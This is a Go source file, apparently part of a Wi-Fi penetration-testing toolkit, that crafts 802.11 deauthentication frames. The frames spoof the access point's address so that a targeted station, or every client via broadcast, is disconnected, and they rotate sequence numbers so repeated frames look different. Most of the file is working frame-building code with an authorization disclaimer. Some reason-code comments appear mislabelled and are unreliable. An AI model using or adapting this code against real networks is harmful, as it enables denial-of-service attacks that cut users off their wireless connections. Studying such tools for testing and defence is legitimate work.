// GNULTE — network testing toolkit.
//
// Copyright (C) 2026 Neptune Productions.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see <https://www.gnu.org/licenses/>.

// Package deauth builds and injects 802.11 Deauthentication frames.
//
// A deauth is a management frame (subtype 12) sent by a station or access
// point to tear down an association. The targeted variant used in Wi-Fi
// testing crafts the frame with the source address set to the access point's
// BSSID and the destination set to a single victim station: the victim
// believes the router disconnected it and drops its association. Sending it
// again keeps the client from staying attached while it tries to rejoin, which
// is the standard way a router's "kick client" knob is reproduced in
// penetration testing windows. Use it only on networks you own or are
// authorized to test.
//
// On Linux the frame is injected through an AF_PACKET raw socket on a wireless
// interface already in monitor mode; the NIC appends the FCS on transmit, so
// the crafted frame carries no checksum. Frame bytes are produced here in Go
// with no external tools.
package deauth

import (
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

// Reason codes commonly used in testing. 7 ("non-AP station leaving BSS") reads
// as a clean disconnect by the AP, which is the "router kicked me" story.
const (
	ReasonUnspecified           uint16 = 1
	ReasonLeavingBSS            uint16 = 7
	ReasonDisassociatedNeedAuth uint16 = 2
)

// Broadcast is the all-stations destination; a deauth aimed at it evicts every
// client currently associated to the BSSID.
const Broadcast = "ff:ff:ff:ff:ff:ff"

// MAC is a parsed, byte-order-natural 48-bit address.
type MAC struct {
	Addr [6]byte
}

// String renders the MAC in canonical lowercase colon form.
func (m MAC) String() string {
	return fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x",
		m.Addr[0], m.Addr[1], m.Addr[2], m.Addr[3], m.Addr[4], m.Addr[5])
}

// IsBroadcast reports whether all six octets are 0xff.
func (m MAC) IsBroadcast() bool {
	for _, b := range m.Addr {
		if b != 0xff {
			return false
		}
	}
	return true
}

// ParseMAC accepts colon, dash, dot-grouped Cisco, or bare hex forms
// (e.g. "00:0c:41:63:45:6a", "00-0C-41-63-45-6A", "000c4163456a").
func ParseMAC(s string) (MAC, error) {
	var m MAC
	clean := strings.NewReplacer(":", "", "-", "").Replace(strings.TrimSpace(s))
	clean = strings.ReplaceAll(clean, ".", "")
	if len(clean) != 12 {
		return m, fmt.Errorf("invalid MAC %q: expected 12 hex digits", s)
	}
	raw, err := hex.DecodeString(clean)
	if err != nil {
		return m, fmt.Errorf("invalid MAC %q: %w", s, err)
	}
	copy(m.Addr[:], raw)
	return m, nil
}

// Frame builds a radiotap-prefixed 802.11 Deauthentication management frame.
//
// Layout: 8-byte radiotap header, then the 24-byte 802.11 header
// (frame control 0x00c0 = management/deauth, duration, DA, SA, BSSID,
// sequence control) and the 2-byte reason code. Source is the AP BSSID so the
// victim reads the notice as coming from its router. seq counter rotates in
// the 12-bit sequence field, which keeps the frames from looking identical.
func Frame(bssid, station MAC, reason uint16, seq uint16) []byte {
	f := make([]byte, 0, 34)
	// Radiotap header: version 0, pad 0, length 8, no present bits.
	f = append(f, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00)
	// Frame control: protocol version 0 + management type + deauth subtype.
	f = append(f, 0xc0, 0x00)
	// Duration: 0 (not a data frame).
	f = append(f, 0x00, 0x00)
	// Destination (victim), source (AP BSSID), BSSID (AP).
	f = append(f, station.Addr[:]...)
	f = append(f, bssid.Addr[:]...)
	f = append(f, bssid.Addr[:]...)
	// Sequence control: 12-bit seq + fragment number 0.
	f = append(f, byte(seq&0x00ff), byte(((seq&0x0f00)>>8)<<4))
	// Reason code (little-endian).
	f = append(f, byte(reason&0x00ff), byte((reason&0xff00)>>8))
	return f
}

// FrameSize is the total length of a deauth frame produced by Frame.
const FrameSize = 34

// MonitorMode inspects a wireless interface and reports whether it is in
// monitor mode. It trusts `iw` when present, then falls back to the kernel's
// ARPHRD type in sysfs (803 = radiotap, 801 = 802.11, both used by monitor
// adapters; 1 = ethernet/managed). An empty return means "cannot determine".
func MonitorMode(iface string) string {
	if out, err := exec.Command("iw", "dev", iface, "info").Output(); err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			f := strings.Fields(line)
			if len(f) >= 2 && f[0] == "type" {
				if f[1] == "monitor" {
					return "monitor"
				}
				return "not-monitor"
			}
		}
	}
	b, err := os.ReadFile("/sys/class/net/" + iface + "/type")
	if err != nil {
		return ""
	}
	switch strings.TrimSpace(string(b)) {
	case "803", "801":
		return "monitor"
	case "1":
		return "not-monitor"
	}
	return ""
}

// InterfaceExists checks for a live device of the given name.
func InterfaceExists(iface string) bool {
	nif, err := net.InterfaceByName(iface)
	return err == nil && nif != nil
}

var errNotLinux = errors.New("wifi frame injection is Linux-only (AF_PACKET raw sockets)")
